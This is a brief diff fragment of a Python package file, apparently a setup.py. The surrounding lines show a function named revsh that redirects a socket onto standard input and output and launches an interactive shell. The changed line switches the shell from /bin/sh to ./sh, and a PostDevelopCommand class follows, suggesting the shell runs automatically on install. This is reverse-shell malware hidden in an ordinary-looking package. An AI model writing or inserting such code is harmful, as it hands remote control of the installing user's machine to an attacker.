@@ -16,7 +16,7 @@ def revsh():
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"]);
+    p=subprocess.call(["./sh","-i"]);
 
 
 class PostDevelopCommand(develop):
